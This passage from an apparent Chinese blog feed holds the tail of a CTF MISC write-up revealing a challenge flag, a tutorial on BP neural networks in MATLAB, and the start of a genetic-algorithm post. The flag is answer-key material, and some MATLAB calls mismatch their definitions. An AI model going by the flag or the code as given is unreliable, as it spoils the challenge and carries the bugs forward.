bin2hex("0b101")</span></span><br></pre></td></tr></table></figure><p>生成的<code>res.bin</code>实际为文本文件，打开即可看到flag：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat res.bin</span><br><span class="line">Let<span class="string">'s look this lyrics:The black sky hangs down,The bright stars follow,The insect winged insect flies,Who are you missing,The space star bursts into tears,The ground rose withers,The cold wind blows the cold wind to blow,So long as has you to accompany,The insect fly rests,A pair of pair only then beautiful,Did not fear darkness only fears brokenheartedly,No matter is tired,Also no matter four cardinal points.Emmmm,It looks like you don'</span>t care about this lyrics. Well, this is flag:flag&#123;e0754197-e3ab-4d0d-b98f-96174c378a34&#125;Let<span class="string">'s look this lyric</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web安全 </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>神经网络——数值分析问题的最后杀手锏</title>
      <link href="/%E6%95%B0%E6%A8%A1-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E6%95%B0%E5%80%BC%E5%88%86%E6%9E%90%E9%97%AE%E9%A2%98%E7%9A%84%E6%9C%80%E5%90%8E%E6%9D%80%E6%89%8B%E9%94%8F/"/>
      <url>/%E6%95%B0%E6%A8%A1-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E6%95%B0%E5%80%BC%E5%88%86%E6%9E%90%E9%97%AE%E9%A2%98%E7%9A%84%E6%9C%80%E5%90%8E%E6%9D%80%E6%89%8B%E9%94%8F/</url>
      
        <content type="html"><![CDATA[<p>我刚接触神经网络的那会它还没有像现在那么火热，当时我对它的效果很不屑，因为它在小样本的时候效果很差，但是到了研究生阶段再次遇到它的时候我对它有了新的认识，包括其内部的算法，有时间的话会另开一文再议，本文为16年我在数学建模中对神经网络算法的理解。</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>神经网络与之前的模拟退火,遗传算法并称为三大智能算法.但其与后两者的功能完全不同.他所解决的不是优化问题,而是类似于拟合,插值的问题.<br>虽然其算法理论复杂,但是由于在MATLAB中的易于使用,所以也是处理数值分析问题的最后杀手锏.</p><a id="more"></a><p><img src="/数模-神经网络——数值分析问题的最后杀手锏/nnet.jpg" alt="nnet"></p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>神经网络只是一个一类算法的总称,下面我们演示其中一个最常见,也是最通用的一种—BP神经网络.<br>例1:使用神经网络做<code>x^2+y^2</code>的插值</p><ol><li><p>确定自变量为p行q列矩阵,p指实验次数,q指自变量个数:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x1=[<span class="number">1</span>:<span class="number">3</span>:<span class="number">20</span>]';</span><br><span class="line">x2=[<span class="number">1</span>:<span class="number">3</span>:<span class="number">20</span>]';</span><br><span class="line">x=[x1,x2]</span><br></pre></td></tr></table></figure></li><li><p>确定因变量为p行r列矩阵,p指实验次数,r指因变量个数:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y=x1.^<span class="number">2</span>+x2.^<span class="number">2</span></span><br></pre></td></tr></table></figure></li><li><p>拷贝<code>EzBp.m</code>文件到当前目录,调用函数<code>EzBP(x,y)</code>:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[net,is,os]=EzBP(x,y);</span><br></pre></td></tr></table></figure><p>若弹出神经网络的控制台,如:</p><p><img src="/数模-神经网络——数值分析问题的最后杀手锏/nnet_train.jpg" alt="nnet_train"></p><p>表明成功.</p></li><li><p>测试结果.net表示学习完毕的神经网络,is方便我们对测试数据归一化,os方便我们将神经网络的返回的结果反归一化,得到我们的结果.<br>现在我们用(11,11)测试一下(正确结果应该是11^2+11^2=242).</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">testnum=[<span class="number">11</span>,<span class="number">11</span>]'</span><br><span class="line"><span class="comment">%输入值归一化</span></span><br><span class="line">inputNum=mapminmax(<span class="string">'apply'</span>,testNum,is);</span><br><span class="line"><span class="comment">%放入神经网络,进行计算</span></span><br><span class="line">outputNum=net(inputNum);</span><br><span class="line"><span class="comment">%将神经网络的值反归一化</span></span><br><span class="line">res=mapminmax(<span class="string">'reverse'</span>,outputNum,os)</span><br></pre></td></tr></table></figure><p> 结果(你的可能跟我不一样):</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">res =</span><br><span class="line">  <span class="number">245.5549</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="函数内部源码"><a href="#函数内部源码" class="headerlink" title="函数内部源码"></a>函数内部源码</h1><p>整个函数不难,结合一下流程图自己就能看懂.</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="params">[net,ps,ts]</span>=<span class="title">EzBP</span><span class="params">(P,T,x)</span>;</span></span><br><span class="line">    <span class="comment">% input x个体初始权值和阀值</span></span><br><span class="line">    <span class="comment">% input P样本输入(n line,1 col)</span></span><br><span class="line">    <span class="comment">% input T样本输出(n line,1 col)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">% output net BP神经网络</span></span><br><span class="line">    <span class="comment">% output ps  输入值归一化矩阵</span></span><br><span class="line">    <span class="comment">% output ts  输出值归一化矩阵</span></span><br><span class="line"></span><br><span class="line">    nntwarn off     <span class="comment">%关闭警告</span></span><br><span class="line">    P=P';</span><br><span class="line">    T=T';</span><br><span class="line">    <span class="comment">%数据预处理--归一化处理</span></span><br><span class="line">    [P,ps]=mapminmax(P);</span><br><span class="line">    [T,ts]=mapminmax(T);</span><br><span class="line">    [pr,pc]=<span class="built_in">size</span>(P);</span><br><span class="line">    [tr,tc]=<span class="built_in">size</span>(T);</span><br><span class="line"></span><br><span class="line">    <span class="comment">%设置隐藏神经元个数,一般设置2*inputNum+1</span></span><br><span class="line">    inputNum=pr;</span><br><span class="line">    outputNum=tr;</span><br><span class="line">    hiddenNum=<span class="number">2</span>*inputNum+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">%新建一个神经网络对象,这里采用tansig的激励算子,这个算子对非线性的插值计算效果较好</span></span><br><span class="line">    net=newff(minmax(P),[hiddenNum,outputNum],&#123;<span class="string">'tansig'</span>,<span class="string">'tansig'</span>&#125;); <span class="comment">%隐含层 输出层</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">%设置神经网络训练的结束条件</span></span><br><span class="line">    net.trainParam.epochs=<span class="number">1e5</span>;</span><br><span class="line">    net.trainParam.goal=<span class="number">1e-5</span>;</span><br><span class="line">    net.trainParam.lr=<span class="number">0.05</span>;</span><br><span class="line">    net.trainParam.show=<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> nargin==<span class="number">3</span></span><br><span class="line">        net.trainParam.showwindow=<span class="built_in">false</span>;</span><br><span class="line">        w1num=inputNum*hiddenNum;</span><br><span class="line">        w2num=outputNum*hiddenNum;</span><br><span class="line">        w1=x(<span class="number">1</span>:w1num);</span><br><span class="line">        B1=x(w1num+<span class="number">1</span>:w1num+hiddenNum);</span><br><span class="line">        w2=x(w1num+hiddenNum+<span class="number">1</span>:w1num+hiddenNum+w2num);</span><br><span class="line">        B2=x(w1num+hiddenNum+w2num+<span class="number">1</span>:w1num+hiddenNum+w2num+outputNum);</span><br><span class="line">        net.iw&#123;<span class="number">1</span>,<span class="number">1</span>&#125;=<span class="built_in">reshape</span>(w1,hiddenNum,inputNum);</span><br><span class="line">        net.lw&#123;<span class="number">2</span>,<span class="number">1</span>&#125;=<span class="built_in">reshape</span>(w2,outputNum,hiddenNum);</span><br><span class="line">        net.b&#123;<span class="number">1</span>&#125;=<span class="built_in">reshape</span>(B1,hiddenNum,<span class="number">1</span>);</span><br><span class="line">        net.b&#123;<span class="number">2</span>&#125;=<span class="built_in">reshape</span>(B2,outputNum,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="comment">%训练</span></span><br><span class="line">    net=train(net,P,T);</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h1 id="优化技巧"><a href="#优化技巧" class="headerlink" title="优化技巧"></a>优化技巧</h1><p>神经网络的效果的好坏由(1)所选用的训练数据(2)神经元个数,(3)激励算子所决定.下面介绍一些简单的优化方法.</p><h2 id="归一化-取典型值"><a href="#归一化-取典型值" class="headerlink" title="归一化,取典型值"></a>归一化,取典型值</h2><p>这是最简单的一种,归一化在EzBP函数里已经默认提供,说一下去典型值的意思:</p><p>举个例子,我们要拟合<code>y=2*x</code>,给的训练数据是<code>x=1:10,y=2*x</code>.那我把<code>1.5</code>放进去,出来的值很可能就是<code>3.0±0.1</code>的值,很靠谱吧?<br>而我把<code>100</code>放进去,呵呵,那就不晓得是什么离谱的值了.现在知道什么叫<strong>典型</strong>的意思了吧.一般的,我们把每一变量的最大值和最低值放到网络中学习,而选用一部分中间的值作为验证.</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="params">[train,test]</span>=<span class="title">ChooseData</span><span class="params">(data)</span></span></span><br><span class="line">    feature=[];</span><br><span class="line">    <span class="keyword">for</span> eachCow=data</span><br><span class="line">        [maxNum,maxPos]=<span class="built_in">max</span>(eachCow);</span><br><span class="line">        [minNum,minPos]=<span class="built_in">min</span>(eachCow);</span><br><span class="line">        feature=union(feature,maxPos);</span><br><span class="line">        feature=union(feature,minPos);</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    dataNum=<span class="built_in">size</span>(data,<span class="number">1</span>);</span><br><span class="line">    rand_=randperm(dataNum);</span><br><span class="line">    needToChoose=<span class="built_in">floor</span>(dataNum*<span class="number">0.9</span>)</span><br><span class="line">    train=union(feature,rand_(<span class="number">1</span>:needToChoose));</span><br><span class="line">    test=rand_(needToChoose:<span class="keyword">end</span>);</span><br><span class="line">    train=data(train,:);</span><br><span class="line">    test=data(test,:);</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="交叉验证"><a href="#交叉验证" class="headerlink" title="交叉验证"></a>交叉验证</h2><p>交叉验证是在训练数据比较少的情况下,增加训练数据的好方法.这里也给出简单的操作函数<code>CvBP(x,y[,n])</code>.<code>n</code>为可选参数,n越大训练数据会变得更多.但也不意味着训练结果会更好(过分学习的情况).</p><p><code>demo.m</code>:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">x1=[<span class="number">1</span>:<span class="number">3</span>:<span class="number">20</span>]';</span><br><span class="line">x2=[<span class="number">1</span>:<span class="number">3</span>:<span class="number">20</span>]';</span><br><span class="line">x=[x1,x2];</span><br><span class="line"></span><br><span class="line">y=x1.^<span class="number">2</span>+x2.^<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">net=CvBP(x,y,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">testNum=[<span class="number">11</span>,<span class="number">11</span>]';</span><br><span class="line"></span><br><span class="line"><span class="comment">%放入神经网络,进行计算</span></span><br><span class="line">outputNum=net(testNum)</span><br></pre></td></tr></table></figure><p><code>CvBP.m</code>:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">perfectNet</span>=<span class="title">CvBP</span><span class="params">(P,T,num)</span></span></span><br><span class="line">    pdata=P';</span><br><span class="line">    tdata=T';</span><br><span class="line"></span><br><span class="line">    pTrain=P;</span><br><span class="line">    tTrain=T;</span><br><span class="line"></span><br><span class="line">    n=<span class="number">10</span>;</span><br><span class="line">    <span class="comment">%% 交叉验证</span></span><br><span class="line">    mse_max=<span class="number">10e30</span>;</span><br><span class="line">    desiredInput=[];</span><br><span class="line">    desiredOutput=[];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> nargin==<span class="number">2</span></span><br><span class="line">        num=<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    indices = crossvalind(<span class="string">'Kfold'</span>,<span class="built_in">length</span>(pTrain),num);</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span>:num</span><br><span class="line">        perfp=[];</span><br><span class="line">        <span class="built_in">disp</span>([<span class="string">'The result of '</span>,num2str(<span class="built_in">i</span>),<span class="string">'/'</span>,num2str(num)])</span><br><span class="line">        test = (indices == <span class="built_in">i</span>); trainA = ~test;</span><br><span class="line">        pCvTrain=pTrain(trainA,:);</span><br><span class="line">        tCvTrain=tTrain(trainA,:);</span><br><span class="line">        pCvTest=pTrain(test,:);</span><br><span class="line">        tCvTest=tTrain(test,:);</span><br><span class="line">        pCvTrain=pCvTrain';</span><br><span class="line">        tCvTrain=tCvTrain';</span><br><span class="line">        pCvTest= pCvTest';</span><br><span class="line">        tCvTest= tCvTest';</span><br><span class="line"></span><br><span class="line">        nett=feedforwardnet(n);</span><br><span class="line">        <span class="comment">% net.trainParam.epochs=100000;</span></span><br><span class="line">        <span class="comment">% net.trainParam.show=200;</span></span><br><span class="line">        <span class="comment">% net.trainParam.goal=1e-4;</span></span><br><span class="line">        <span class="comment">% net=train(net,desired_input,desired_output);</span></span><br><span class="line">        nett=train(nett,pCvTrain,tCvTrain);</span><br><span class="line">        testOut=nett(pCvTest);</span><br><span class="line">        perf=perform(nett,testOut,tCvTest);</span><br><span class="line">        <span class="keyword">if</span> mse_max&gt;perf</span><br><span class="line">            perfectNet=nett;</span><br><span class="line">            mse_max=perf;</span><br><span class="line">            desiredInput=pCvTrain;</span><br><span class="line">            desiredOutput=tCvTrain;</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>结果:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">outputNum =</span><br><span class="line">  <span class="number">245.5549</span></span><br></pre></td></tr></table></figure><h2 id="与遗传算法结合"><a href="#与遗传算法结合" class="headerlink" title="与遗传算法结合"></a>与遗传算法结合</h2><p>还记得以前介绍的遗传算法嘛?注意到EzBP的第三个参数了嘛?没错,这就是给遗传算法准备的.其实,在初始化神经网络时,每个神经元都有一个初始的值[-0.5,0.5],如果用遗传算法对这个进行优化,就会对结果造成影响.(实际效果不好).</p><p><code>demo.m</code>:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">x1=[<span class="number">1</span>:<span class="number">3</span>:<span class="number">20</span>]';</span><br><span class="line">x2=[<span class="number">1</span>:<span class="number">3</span>:<span class="number">20</span>]';</span><br><span class="line">x=[x1,x2];</span><br><span class="line"></span><br><span class="line">y=x1.^<span class="number">2</span>+x2.^<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">[net,is,os]=GABP(x,y);</span><br><span class="line"></span><br><span class="line">testNum=[<span class="number">11</span>,<span class="number">11</span>]';</span><br><span class="line"></span><br><span class="line"><span class="comment">%输入值归一化</span></span><br><span class="line">inputNum=mapminmax(<span class="string">'apply'</span>,testNum,is);</span><br><span class="line"><span class="comment">%放入神经网络,进行计算</span></span><br><span class="line">outputNum=net(inputNum);</span><br><span class="line"><span class="comment">%将神经网络的值反归一化</span></span><br><span class="line">res=mapminmax(<span class="string">'reverse'</span>,outputNum,os)</span><br></pre></td></tr></table></figure><p><code>GABP.m</code>:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="params">[net,ps,ts,perf]</span>=<span class="title">GABP</span><span class="params">(P,T)</span></span></span><br><span class="line">    inputNum=<span class="built_in">size</span>(P,<span class="number">2</span>);</span><br><span class="line">    outputNum=<span class="built_in">size</span>(T,<span class="number">2</span>);</span><br><span class="line">    P_T=[P T];</span><br><span class="line">    [train,test]=ChooseData(P_T);</span><br><span class="line">    trainX=train(:,<span class="number">1</span>:inputNum);</span><br><span class="line">    trainY=train(:,inputNum+<span class="number">1</span>:<span class="keyword">end</span>);</span><br><span class="line">    testX=test(:,<span class="number">1</span>:inputNum);</span><br><span class="line">    testY=test(:,inputNum+<span class="number">1</span>:<span class="keyword">end</span>);</span><br><span class="line">    hiddenNum=<span class="number">2</span>*inputNum+<span class="number">1</span>;</span><br><span class="line">    w1num=inputNum*hiddenNum;</span><br><span class="line">    w2num=outputNum*hiddenNum;</span><br><span class="line">    N=w1num+hiddenNum+w2num+outputNum;</span><br><span class="line"></span><br><span class="line">    bound=<span class="built_in">repmat</span>([<span class="number">-0.5</span> <span class="number">0.5</span>],N,<span class="number">1</span>);</span><br><span class="line">    [best,x]=EzGA(bound,@fun,<span class="number">20</span>,&#123;trainX,trainY,testX,testY&#125;);</span><br><span class="line">    [net,ps,ts,perf]=EzBP(trainX,trainY,x,testX,testY);</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>神经网络算法是一套历史悠久也比较成熟的机器学习算法.是对付数值分析问题的最后杀手锏.我们一般比较常用的一种神经网络是BP神经网络.本文也以BP神经网络的使用及其优化进行了详细讲解,同时提供了可调用的函数原型.<br>但想要得到较好效果,还建议学习其他的一些神经网络,了解其各自优势.但由于这一类算法普遍稳定性较差,如果不是万不得已,或是效果超群,不建议使用.同时,若要使用此算法,请务必抽出一部分样本用来检验(<strong>严禁拿结果直接来学习,然后返回结果!!</strong>)</p><p>其算法优劣分析如下(笔者认为):<br>优点:</p><ol><li>所适用的类型广泛.如果优化的好,几乎可以解决比赛中遇到的各种问题.e.g.插值,拟合,聚类.</li><li>对非线性数据的拟合效果优异.实在没看出数据有啥规律,神经网络至少算是一种解决方法.</li></ol><p>缺点:</p><ol><li>需要大量的样本数据</li></ol><p>源程序: <a href="https://github.com/Anemone95/matlab-nnet" target="_blank" rel="noopener">https://github.com/Anemone95/matlab-nnet</a></p>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> 算法 </tag>
            
            <tag> 人工智能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>遗传算法——另一个求最优解的智能算法</title>
      <link href="/%E6%95%B0%E6%A8%A1-%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95%E2%80%94%E2%80%94%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%B1%82%E6%9C%80%E4%BC%98%E8%A7%A3%E7%9A%84%E6%99%BA%E8%83%BD%E7%AE%97%E6%B3%95/"/>
      <url>/%E6%95%B0%E6%A8%A1-%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95%E2%80%94%E2%80%94%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%B1%82%E6%9C%80%E4%BC%98%E8%A7%A3%E7%9A%84%E6%99%BA%E8%83%BD%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>遗传算法是求解近似最优解的最具代表性的智能算法之一，如今的很多方法都可以看到它的影子，比如说之前在研究的基于覆盖率的fuzz测试，其中的输入变异就类似于遗传算法，故从旧博客搬运来。</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>遗传算法在外部体现同模拟退火一样,也是属于优化问题的一个求解器.但由于其优异的收敛速度和比模拟退火更优秀的结果,在对结果要求高的题目上,它也成为我们求解问题的常用方法.</p><a id="more"></a><p><img src="/数模-遗传算法——另一个求最优解的智能算法/ga-1545742951220.jpg" alt="ga"></p><h1 id="快速使用"><a href="#快速使用" class="headerlink" title="快速使用"></a>快速使用</h1><p>遗传算法在实现上比模拟退火要复杂很多,但若不关心其内部算法,使用上反而比模拟退火要简单.</p><h2 id="连续型随机变量"><a href="#连续型随机变量" class="headerlink" title="连续型随机变量"></a>连续型随机变量</h2><p><strong>案例一:</strong>求<code>min(x^2+y^2),x,y∈[-1e5,1e5]</code>:</p><ol><li><p>复制<code>GANorm</code>文件夹到你的工作目录.</p></li><li><p>同文件夹下新建<code>demo.m</code>文件,输入:</p> <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">y=@(x)x(<span class="number">1</span>)^<span class="number">2</span>+x(<span class="number">2</span>)^<span class="number">2</span>;</span><br><span class="line">[best,x]=EzGA([<span class="number">-1e5</span> <span class="number">1e5</span>;<span class="number">-1e5</span> <span class="number">1e5</span>],y)</span><br></pre></td></tr></table></figure></li><li><p>运行<code>demo.m</code>文件,得到从运行及结果:</p> <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sizepop =</span><br><span class="line">        <span class="number">1000</span></span><br><span class="line">best =</span><br><span class="line">    <span class="number">3.9901</span></span><br><span class="line">x =</span><br><span class="line">    <span class="number">1.9975</span>   <span class="number">-0.0001</span></span><br></pre></td></tr></table></figure><p> 没错,简单的遗传算法函数的调用形式为EzGA(变量上下限,目标函数句柄[,初始种群数量=500,附加数据]),注意第三个,第四个变量为可选参数.</p></li></ol><p><strong>案例二:</strong>求<code>min(0.7*x(1)+0.8*x(2)),x,y∈[-1e5,1e5]</code>:</p><ol><li><p>复制<code>GANorm</code>文件夹到你的工作目录.</p></li><li><p>同文件夹下新建<code>demo2.m</code>文件,输入:</p> <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[best,x]=EzGA([<span class="number">-1e5</span> <span class="number">1e5</span>;<span class="number">-1e5</span> <span class="number">1e5</span>],@OptFun,<span class="number">1e2</span>,[<span class="number">0.7</span> <span class="number">0.8</span>])</span><br></pre></td></tr></table></figure></li><li><p>同文件夹下新建<code>OptFun.m</code>文件,输入:</p> <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">y</span>=<span class="title">OptFun</span><span class="params">(x,coe)</span></span></span><br><span class="line">    y=coe(<span class="number">1</span>)*x(<span class="number">1</span>)^<span class="number">2</span>+coe(<span class="number">2</span>)*x(<span class="number">2</span>)^<span class="number">2</span>;</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></li><li><p>运行<code>demo2.m</code>文件,得到从运行及结果:</p> <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sizepop =</span><br><span class="line">   <span class="number">100</span></span><br><span class="line">best =</span><br><span class="line">   <span class="number">1.1761e-07</span></span><br><span class="line">x =</span><br><span class="line">   <span class="number">1.0e-03</span> *</span><br><span class="line">   <span class="number">-0.0079</span>    <span class="number">0.3834</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="原理讲解"><a href="#原理讲解" class="headerlink" title="原理讲解"></a>原理讲解</h1><p>以下结合案例,来解释一下遗传算法的具体实现.</p><h2 id="连续型随机变量-TSP问题"><a href="#连续型随机变量-TSP问题" class="headerlink" title="连续型随机变量(TSP问题)"></a>连续型随机变量(TSP问题)</h2><p>下面又是我们的旅行商问题,同样,我们有图(*代表城镇):<br><img src="/数模-遗传算法——另一个求最优解的智能算法/graph.jpg" alt="graph"></p><p>首先,结合流程图,我们首先写主函数调用遗传算法<code>GATSP</code><br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">%记录了城镇的坐标</span></span><br><span class="line">X=[</span><br><span class="line"><span class="number">16.47</span>,<span class="number">96.10</span></span><br><span class="line"><span class="number">16.47</span>,<span class="number">94.44</span></span><br><span class="line"><span class="number">20.09</span>,<span class="number">92.54</span></span><br><span class="line"><span class="number">22.39</span>,<span class="number">93.37</span></span><br><span class="line"><span class="number">25.23</span>,<span class="number">97.24</span></span><br><span class="line"><span class="number">22.00</span>,<span class="number">96.05</span></span><br><span class="line"><span class="number">20.47</span>,<span class="number">97.02</span></span><br><span class="line"><span class="number">17.29</span>,<span class="number">96.29</span></span><br><span class="line"><span class="number">16.30</span>,<span class="number">97.38</span></span><br><span class="line"><span class="number">14.05</span>,<span class="number">98.12</span></span><br><span class="line"><span class="number">16.53</span>,<span class="number">97.38</span></span><br><span class="line"><span class="number">21.52</span>,<span class="number">95.59</span></span><br><span class="line"><span class="number">20.09</span>,<span class="number">92.55</span>];</span><br><span class="line">D=Distance(X); <span class="comment">%取得邻接矩阵</span></span><br><span class="line">N=<span class="built_in">size</span>(D,<span class="number">1</span>);    <span class="comment">%城镇数</span></span><br><span class="line"><span class="comment">%调用遗传算法</span></span><br><span class="line">[obj,x]=GATSP(N,D);</span><br></pre></td></tr></table></figure></p><p>遗传算法主函数:<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 